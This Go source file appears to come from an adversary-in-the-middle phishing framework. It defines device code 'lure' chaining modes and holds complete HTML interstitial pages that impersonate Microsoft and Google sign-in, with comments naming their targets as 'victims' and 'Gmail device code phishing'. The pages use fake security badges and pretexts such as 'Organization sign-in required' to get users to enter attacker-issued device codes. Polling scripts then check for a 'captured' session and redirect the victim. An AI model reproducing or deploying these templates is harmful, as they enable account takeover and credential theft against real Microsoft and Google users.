package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining (default)
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Sign in to your account</title>
<link rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.02)}}
@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
@keyframes spin{to{transform:rotate(360deg)}}
body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Oxygen,Ubuntu,sans-serif;background:linear-gradient(135deg,#f5f5f5 0%,#e8e8e8 100%);min-height:100vh;display:flex;flex-direction:column}
.bg-pattern{position:fixed;top:0;left:0;right:0;bottom:0;background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%230078d4' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");z-index:0}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;z-index:1}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.1),0 10px 40px rgba(0,0,0,.1);max-width:440px;width:100%;animation:fadeIn .4s ease-out}
.card-inner{padding:44px 48px}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:28px}
.logo svg{width:108px;height:24px}
.avatar{width:48px;height:48px;background:linear-gradient(135deg,#0078d4 0%,#00bcf2 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;box-shadow:0 4px 12px rgba(0,120,212,.3)}
.avatar svg{width:24px;height:24px;fill:#fff}
.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px;line-height:1.3}
.subtitle{font-size:15px;color:#5e5e5e;line-height:1.6;margin-bottom:32px}
.code-section{background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);border-radius:12px;padding:28px;margin-bottom:28px;text-align:center;position:relative;overflow:hidden}
.code-section::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent);background-size:200% 100%;animation:shimmer 2s infinite}
.code-label{font-size:12px;color:rgba(255,255,255,.85);text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;font-weight:500}
.code{font-size:36px;font-weight:700;letter-spacing:8px;color:#fff;font-family:'Segoe UI',monospace;text-shadow:0 2px 4px rgba(0,0,0,.2);margin-bottom:16px}
.copy-btn{background:rgba(255,255,255,.2);backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,.3);color:#fff;padding:10px 28px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:8px}
.copy-btn:hover{background:rgba(255,255,255,.3);transform:translateY(-1px)}
.copy-btn svg{width:16px;height:16px;fill:currentColor}
.copied-msg{color:#fff;font-size:13px;margin-top:10px;min-height:20px;font-weight:500}
.divider{display:flex;align-items:center;gap:16px;margin-bottom:24px;color:#a0a0a0;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
.steps{margin-bottom:28px}
.step{display:flex;align-items:center;gap:16px;padding:14px 0;border-bottom:1px solid #f0f0f0}
.step:last-child{border-bottom:none}
.step-icon{width:36px;height:36px;background:#f0f7ff;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-icon svg{width:18px;height:18px;fill:#0078d4}
.step-text{font-size:14px;color:#1b1b1b;line-height:1.5}
.step-text strong{font-weight:600}
.continue-btn{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);color:#fff;border:none;padding:16px 24px;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;text-decoration:none;box-shadow:0 4px 14px rgba(0,120,212,.4)}
.continue-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,120,212,.5)}
.continue-btn:active{transform:translateY(0)}
.continue-btn svg{width:20px;height:20px;fill:#fff}
.security-badge{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px;background:#f8f8f8;border-radius:6px}
.security-badge svg{width:16px;height:16px;fill:#107c10}
.security-badge span{font-size:12px;color:#5e5e5e}
.timer{text-align:center;font-size:12px;color:#a0a0a0;margin-top:16px}
.timer span{font-weight:600;color:#5e5e5e}
.footer{padding:20px;text-align:center;position:relative;z-index:1}
.footer-links{display:flex;justify-content:center;gap:24px;flex-wrap:wrap}
.footer-links a{font-size:12px;color:#5e5e5e;text-decoration:none}
.footer-links a:hover{text-decoration:underline}
.spinner{display:none;width:24px;height:24px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
.complete{display:none;text-align:center;padding:20px 0}
.complete-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10 0%,#0e6b0e 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 4px 14px rgba(16,124,16,.4)}
.complete-icon svg{width:36px;height:36px;fill:#fff}
.complete-title{font-size:22px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
.complete-text{font-size:15px;color:#5e5e5e}
.progress-bar{width:120px;height:4px;background:#e0e0e0;border-radius:2px;margin:16px auto 0;overflow:hidden}
.progress-bar-fill{height:100%;background:#107c10;border-radius:2px;animation:progress 1.5s ease-out forwards}
@keyframes progress{from{width:0}to{width:100%}}
</style>
</head>
<body>
<div class="bg-pattern"></div>
<div class="main">
<div class="card">
<div class="card-inner">
<div class="logo">
<svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
<path fill="#f25022" d="M0 0h11v11H0z"/>
<path fill="#7fba00" d="M12 0h11v11H12z"/>
<path fill="#00a4ef" d="M0 12h11v11H0z"/>
<path fill="#ffb900" d="M12 12h11v11H12z"/>
<text x="28" y="17" font-family="Segoe UI,sans-serif" font-size="15" font-weight="600" fill="#1b1b1b">Microsoft</text>
</svg>
</div>

<div id="verifyView">
<div class="avatar">
<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
</div>

<h1 class="title" id="titleText">Verify it's you</h1>
<p class="subtitle" id="subtitleText">For your security, we need to verify your identity. Enter the code below at Microsoft to continue.</p>

<div class="code-section">
<div class="code-label">Verification Code</div>
<div class="code" id="userCode">{user_code}</div>
<button class="copy-btn" onclick="copyCode()">
<svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
Copy code
</button>
<div class="copied-msg" id="copiedMsg">&nbsp;</div>
</div>

<div class="divider">How it works</div>

<div class="steps">
<div class="step">
<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>
<div class="step-text"><strong>Copy</strong> the verification code above</div>
</div>
<div class="step">
<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg></div>
<div class="step-text"><strong>Paste</strong> it at Microsoft's sign-in page</div>
</div>
<div class="step">
<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<div class="step-text"><strong>Sign in</strong> with your Microsoft account</div>
</div>
</div>

<a class="continue-btn" href="{verify_url}" target="_blank" rel="noopener" id="continueBtn">
<svg viewBox="0 0 24 24"><path d="M11.5 3v8.5H3V3h8.5zm0 18H3v-8.5h8.5V21zM21 3v8.5h-8.5V3H21zm0 18h-8.5v-8.5H21V21z"/></svg>
Continue to Microsoft
</a>

<div class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
<span>Protected by Microsoft Security</span>
</div>

<div class="timer">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
</div>

<div class="complete" id="completeView">
<div class="complete-icon">
<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
</div>
<h2 class="complete-title">Verification successful</h2>
<p class="complete-text">You're all set. Redirecting you now...</p>
<div class="progress-bar"><div class="progress-bar-fill"></div></div>
</div>
</div>
</div>
</div>

<div class="footer">
<div class="footer-links">
<a href="#">Terms of use</a>
<a href="#">Privacy & cookies</a>
<a href="#">Contact us</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('titleText').textContent='Additional verification needed';
document.getElementById('subtitleText').textContent='We couldn\'t verify you with your usual method. Please use this code instead.';
}else if(tpl==='compliance'){
document.getElementById('titleText').textContent='Organization sign-in required';
document.getElementById('subtitleText').textContent='Your organization requires additional verification to access this resource.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='✓ Copied to clipboard';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2500);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='✓ Copied to clipboard';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2500);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='0:00';
document.getElementById('continueBtn').style.opacity='0.5';
document.getElementById('continueBtn').style.pointerEvents='none';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){top.location.href=d.redirect_url;}
},2000);
}else if(d.expired){
document.getElementById('countdown').textContent='0:00';
}else{
setTimeout(checkStatus,3000);
}
})
.catch(function(){setTimeout(checkStatus,5000);});
}
setTimeout(checkStatus,4000);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="19" font-family="Product Sans,Google Sans,Roboto,Arial,sans-serif" font-size="22" font-weight="500">
<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc04">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
